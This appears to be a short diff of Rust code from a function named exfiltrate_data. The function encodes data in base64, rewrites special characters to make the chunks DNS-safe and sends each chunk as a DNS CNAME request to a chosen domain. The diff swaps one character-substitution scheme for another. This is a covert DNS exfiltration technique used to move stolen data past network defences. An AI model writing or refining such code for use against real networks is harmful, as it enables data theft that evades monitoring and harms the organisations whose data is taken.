@@ -71,9 +71,7 @@ pub fn exfiltrate_data(data: String, domain: &str) -> Vec<String> {
     for part in to_exfil {
         // Make the base64 dns safe by replacing special chars
         let dns_safe = part.trim_end()
-            .replace("/", "-1")
-            .replace("+", "--")
-            .replace("=", "-0");
+            .replace("_", "--7");
 
         let _res = request::dns_request(dns_safe.as_str(), "cname_record");
     };
